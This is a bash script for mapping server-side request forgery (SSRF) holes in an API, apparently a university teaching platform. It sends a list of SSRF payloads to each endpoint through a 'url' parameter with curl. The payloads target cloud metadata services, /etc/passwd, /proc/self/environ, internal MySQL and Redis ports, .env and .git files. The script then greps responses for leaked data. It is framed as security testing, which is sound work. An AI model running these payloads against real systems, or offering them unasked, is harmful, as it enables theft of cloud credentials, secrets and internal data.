#!/bin/bash

# SSRF Vulnerability Mapping & Testing Script
# This script scans an API for endpoints that accept URLs and tests for SSRF vulnerabilities.
# Author: Ibitope Fatoki, made with a lot of tears and blurry eyes

# Prompt for target details from the user
read -p "Enter the target base URL (localhost): " TARGET_HOST  # Base URL of the target
read -p "Enter the target port (e.g., 4200): " TARGET_PORT  # Port to connect to
read -p "Enter HTTP request method (GET or POST): " REQUEST_METHOD  # HTTP request method to use

# Log file where scan results are saved
LOG_FILE="ssrf_test_results.txt"

# API endpoints to test (from documentation)
API_ENDPOINTS=(
  "/api/activity_types"
  "/api/admin/overseer_images"
  "/api/auth"
  "/api/campuses"
  "/api/csv"
  "/api/projects"
  "/api/settings"
  "/api/students"
  "/api/submission"
  "/api/tasks"
  "/api/teaching_periods"
  "/api/tii_actions"
  "/api/tii_eula"
  "/api/tii_hook"
  "/api/tutorials"
  "/api/unit_roles"
  "/api/units"
  "/api/users"
  "/api/webcal"
  "/api/docs"
  "/api/internal"
  "/api/logs"
  "/api/config"
  "/api/auth_test"
)

# List of common SSRF payloads targeting internal services and metadata endpoints
PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"  # AWS metadata service
  "http://metadata.google.internal/computeMetadata/v1/"  # Google Cloud metadata
  "http://localhost:8080/admin"  # Local admin access attempt
  "file:///etc/passwd"  # Unix password file disclosure
  "file:///proc/self/environ"  # Sensitive environment variables
  "http://localhost:3000/admin"
  "http://127.0.0.1:3000/config"
  "http://localhost:3000/api/internal"
  "http://localhost:3000/rails/info"
  "http://localhost:3000/logs"
  "mysql://127.0.0.1:3306/"  # MySQL service probe
  "mysql://localhost:3306/"
  "redis://127.0.0.1:6379/"  # Redis service probe
  "redis://localhost:6379/"
  "http://127.0.0.1:9876/"  # Internal network probing
  "http://127.0.0.1:54247/"
  "http://127.0.0.1:59465/"
  "file:///var/log/nginx/access.log"  # Nginx access logs
  "http://localhost:4200/.git/config"  # Exposed Git configuration
  "http://169.254.169.254/metadata/instance"  # Additional cloud metadata
  "http://localhost:4200/api/docs/" # API documentation
  "http://localhost:4200/api/internal" # Internal API access
  "http://localhost:4200/api/logs" # Logs access
  "http://localhost:4200/api/config" # Configuration access
  "http://localhost:4200/api/auth_test" # Authentication test
  "http://localhost:4200/api/overseer_images" # Overseer images access
  "http://localhost:4200/api/campuses" # Campus information
  "http://localhost:4200/api/csv" # CSV data access
  "http://localhost:4200/api/projects" # Project information
  "http://localhost:4200/api/settings" # Settings access
  "http://localhost:4200/api/students" # Student information
  "http://localhost:4200/api/submission" # Submission data
  "http://localhost:4200/api/tasks" # Task information
  "http://localhost:4200/api/teaching_periods" # Teaching periods
  "http://localhost:4200/api/tii_actions" # TII actions
  "http://localhost:4200/api/tii_eula" # TII EULA
  "http://localhost:4200/api/tii_hook" # TII hook
  "http://localhost:4200/api/tutorials" # Tutorials access
  "http://localhost:4200/api/unit_roles" # Unit roles access
  "http://localhost:4200/api/units" # Unit information
  "http://localhost:4200/api/users" # User information
  "http://localhost:4200/.env" # Environment variables
  "http://localhost:4200/.git" # Git repository access

)

# Function to log messages to both console and file
echo_and_log() {
  echo "$1"  # Print message to console
  echo "$1" >> "$LOG_FILE"  # Append message to log file
}

# Function to test an API endpoint with SSRF payloads
test_endpoint() {
  local endpoint=$1  # API endpoint being tested
  local full_url="${TARGET_HOST}:${TARGET_PORT}${endpoint}"  # Construct full request URL
  echo_and_log "Testing endpoint: $full_url"

  for payload in "${PAYLOADS[@]}"; do
    encoded_payload=$(printf "%s" "$payload" | jq -sRr @uri)  # Encode URL payload
    test_url="${full_url}?url=${encoded_payload}"  # Construct test request URL
    echo_and_log "Testing: $test_url"

    # Handle POST and GET requests separately
    if [ "$REQUEST_METHOD" == "POST" ]; then
      response_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST --data "url=${encoded_payload}" "$full_url")

      # If we receive a 200 or 302, assume possible SSRF vulnerability
      if [[ "$response_code" =~ 200|302 ]]; then
        echo_and_log "[!] Possible SSRF vulnerability found at: $test_url (POST request)"
      fi
    else  # GET request
      response_body=$(curl -s "$test_url")

      # Check if the response contains sensitive information
      if echo "$response_body" | grep -E "metadata|localhost|internal|root:x:0:0" >/dev/null; then
        echo_and_log "[!] Possible SSRF vulnerability found at: $test_url (GET request - response leak)"
      fi
    fi
  done
}

# Start testing process
echo_and_log "Starting SSRF mapping and testing for $TARGET_HOST on port $TARGET_PORT"
for endpoint in "${API_ENDPOINTS[@]}"; do
  test_endpoint "$endpoint"  # Test each API endpoint
done
echo_and_log "SSRF testing completed. Results saved in $LOG_FILE"
